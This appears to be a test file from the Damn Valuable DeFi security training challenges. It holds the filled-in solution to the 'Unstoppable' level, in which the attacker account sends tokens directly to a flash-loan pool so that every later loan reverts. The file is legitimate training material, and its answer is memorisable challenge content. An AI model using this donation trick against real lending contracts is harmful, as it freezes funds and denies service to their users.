const {
  balance,
  time,
  constants,
  ether,
  BN,
  expectRevert,
} = require("@openzeppelin/test-helpers");

const { accounts, contract, web3 } = require("@openzeppelin/test-environment");

const UnstoppableLender = contract.fromArtifact("UnstoppableLender");
const ReceiverUnstoppable = contract.fromArtifact("ReceiverUnstoppable");
const DamnValuableToken = contract.fromArtifact("DamnValuableToken");

const { expect } = require("chai");

describe("unstoppable challenge", function () {
  const [deployer, attacker, ...otherAccount] = accounts;

  const FLASHLOANER_POOL_BALANCE = ether("1000000");
  const ATTACKER_BALANCE = ether("10");

  before(async function () {
    this.token = await DamnValuableToken.new({
      from: deployer,
    });
    this.pool = await UnstoppableLender.new(this.token.address, {
      from: deployer,
    });

    this.receiver = await ReceiverUnstoppable.new(this.pool.address, {
      from: deployer,
    });

    await this.token.approve(this.pool.address, FLASHLOANER_POOL_BALANCE, {
      from: deployer,
    });
    await this.pool.depositTokens(FLASHLOANER_POOL_BALANCE, { from: deployer });

    await this.token.transfer(attacker, ATTACKER_BALANCE, {
      from: deployer,
    });

    expect(await this.token.balanceOf(this.pool.address)).to.be.bignumber.eq(
      FLASHLOANER_POOL_BALANCE
    );

    expect(await this.token.balanceOf(attacker)).to.be.bignumber.eq(
      ATTACKER_BALANCE
    );

    await this.receiver.executeFlashLoan(20, {
      from: deployer,
    });
  });

  it("Exploit Unstoppable", async function () {
    await this.token.transfer(this.pool.address, ATTACKER_BALANCE, {
      from: attacker,
    });
  });

  after(async function () {
    await expectRevert(
      this.receiver.executeFlashLoan(20, {
        from: deployer,
      }),
      "Failed assertion"
    );

    expect(await this.token.balanceOf(this.pool.address)).to.be.bignumber.gt(
      FLASHLOANER_POOL_BALANCE
    );

    expect(await this.token.balanceOf(attacker)).to.be.bignumber.eq("0");
  });
});
